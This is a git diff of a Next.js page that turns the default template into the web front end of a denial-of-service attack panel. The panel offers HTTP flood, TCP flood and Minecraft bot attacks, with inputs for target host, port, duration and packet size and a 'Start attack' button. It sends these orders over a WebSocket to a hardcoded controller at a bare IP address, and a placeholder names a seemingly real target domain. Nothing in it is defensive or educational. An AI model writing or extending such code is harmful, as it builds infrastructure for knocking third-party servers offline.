@@ -1,65 +1,173 @@
-import Image from "next/image";
+"use client";
+import {use, useEffect, useRef, useState} from "react";
+import {InputText} from "primereact/inputtext";
+import {Dropdown} from "primereact/dropdown";
 
 export default function Home() {
+  const [messages, setMessages] = useState<string[]>([]);
+  const wsRef = useRef<WebSocket>(null);
+  const [closing, setClosing] = useState("closing");
+  const [payload, setPayload] = useState({
+    attackType: "http-flood",
+    host: "",
+    port: "",
+    amount: "",
+    packetSize: "",
+    time: ""
+  });
+  const [buttonDisable, setButtonDisable] = useState(false);
+  const [attackTypes, setAttackTypes] = useState([
+    {value: "http-flood", label: "HTTP Flood"},
+    {value: "tcp-flood", label: "TCP Flood"},
+    {value: "mc-bots", label: "Minecraft Bots"}
+  ]);
+  const [selectedAttack, setSelectedAttack] = useState("http-flood");
+
+  function connectWs(){
+    const ws = new WebSocket("ws://51.75.204.28:8081/api/ws/master");
+    wsRef.current = ws;
+    ws.onopen = () =>{
+      setClosing("");
+      console.log("websocket conectado");
+
+      ws.onmessage = (e) =>{
+        setMessages(prev => [...prev, e.data]);
+      }
+
+      ws.onerror = (err)=>{
+        console.error(err);
+      }
+
+      ws.onclose = () =>{
+        setClosing("closing");
+      }
+    }
+  }
+  useEffect(() => {
+    if(closing === "closing"){
+      connectWs();
+    }
+  }, [closing]);
+  async function handleSubmit () {
+    console.log(wsRef.current?.readyState)
+    setMessages([]);
+    const formatted = {
+      attackType: payload.attackType,
+      host: payload.host,
+      port: Number(payload.port),
+      amount: Number(payload.amount),
+      packetSize: Number(payload.packetSize),
+      time: Number(payload.time)
+    }
+    wsRef.current?.send(JSON.stringify(formatted));
+  }
   return (
-    <div className="flex min-h-screen items-center justify-center bg-zinc-50 font-sans dark:bg-black">
-      <main className="flex min-h-screen w-full max-w-3xl flex-col items-center justify-between py-32 px-16 bg-white dark:bg-black sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={100}
-          height={20}
-          priority
-        />
-        <div className="flex flex-col items-center gap-6 text-center sm:items-start sm:text-left">
-          <h1 className="max-w-xs text-3xl font-semibold leading-10 tracking-tight text-black dark:text-zinc-50">
-            To get started, edit the page.tsx file.
-          </h1>
-          <p className="max-w-md text-lg leading-8 text-zinc-600 dark:text-zinc-400">
-            Looking for a starting point or more instructions? Head over to{" "}
-            <a
-              href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Templates
-            </a>{" "}
-            or the{" "}
-            <a
-              href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-              className="font-medium text-zinc-950 dark:text-zinc-50"
-            >
-              Learning
-            </a>{" "}
-            center.
-          </p>
+    <div className="min-h-screen bg-black p-4">
+      <div className="max-w-6xl mx-auto">
+        <div className="mb-4 flex items-center justify-between">
+          <div className="flex items-center gap-2">
+
+          </div>
+
         </div>
-        <div className="flex flex-col gap-4 text-base font-medium sm:flex-row">
-          <a
-            className="flex h-12 w-full items-center justify-center gap-2 rounded-full bg-foreground px-5 text-background transition-colors hover:bg-[#383838] dark:hover:bg-[#ccc] md:w-[158px]"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={16}
-              height={16}
-            />
-            Deploy Now
-          </a>
-          <a
-            className="flex h-12 w-full items-center justify-center rounded-full border border-solid border-black/[.08] px-5 transition-colors hover:border-transparent hover:bg-black/[.04] dark:border-white/[.145] dark:hover:bg-[#1a1a1a] md:w-[158px]"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            Documentation
-          </a>
+      <div>
+      <div className="flex">
+       <div className={"flex-col m-4"}>
+         <p>Attack type</p>
+         <Dropdown options={attackTypes}
+                   value={selectedAttack}
+                   placeholder={"Select an attack type"}
+                   optionValue="value"
+                   optionLabel="label"
+                   onChange={(e) => {
+                     console.log(e.target.value)
+                     setSelectedAttack(e.target.value);
+                     setPayload(prev => ({...prev, attackType: e.target.value}));
+                   }}
+         />
+       </div>
+
+       <div className="flex-col m-4">
+         <p>host</p>
+         <InputText placeholder={`${selectedAttack === "http-flood" ? "https://dracolegend.net" : "dracolegend.net"}`}
+          onChange={(e)=> setPayload(prev => ({...prev, host: e.target.value}))
+          }
+         />
+       </div>
+          
+        { (selectedAttack === "tcp-flood" || selectedAttack === "mc-bots") && (
+
+            <div className="flex-col m-4">
+              <p>
+                port
+              </p>
+              <InputText placeholder={`25565`}
+               onChange={(e)=> setPayload(prev => ({...prev, port: e.target.value}))
+               }
+              />
+            </div>
+
+        )}
+
+        { (selectedAttack === "tcp-flood" || selectedAttack === "http-flood") ? (
+            <>
+            <div className="flex-col m-4">
+
+            <p>
+                time (seconds)
+              </p>
+              <InputText placeholder={`60`}
+                         onChange={(e)=> setPayload(prev => ({...prev, time: e.target.value}))}
+              />
+            </div>
+            <div className="flex-col m-4">
+
+              <p>
+                packet size (kb)
+              </p>
+              <InputText placeholder={"64"}
+                         onChange={(e)=> setPayload(prev => ({...prev, packetSize: e.target.value}))}
+              />
+
+            </div>
+            </>
+        ) : (
+            <>
+            <div className="flex-col m-4">
+
+            <p>
+                Amount
+              </p>
+              <InputText placeholder={`5`}
+                         onChange={(e)=> setPayload(prev => ({...prev, amount: e.target.value}))}
+              />
+            </div>
+            </>
+        )}
+        <div className={"m-4"}>
+          <button onClick={handleSubmit} className="bg-purple-500 rounded-lg p-4 font-bold"> Start attack </button>
         </div>
-      </main>
+
+      </div>
+      </div>
+        <div
+            className="bg-gray-900 rounded-lg p-4 font-mono text-sm text-green-400
+             h-[calc(80vh-8rem)] overflow-y-auto
+             border border-green-800 shadow-lg shadow-green-900/50
+             flex flex-col-reverse"
+        >
+          {messages.length === 0 ? (
+              <div className="text-gray-500">Waiting for messages...</div>
+          ) : (
+              messages.map((msg, index) => (
+                  <div key={index} className="mb-1 whitespace-pre-wrap">
+                    <span className="text-gray-500">&gt;</span> {msg}
+                  </div>
+              ))
+          )}
+        </div>
+
+      </div>
     </div>
   );
 }
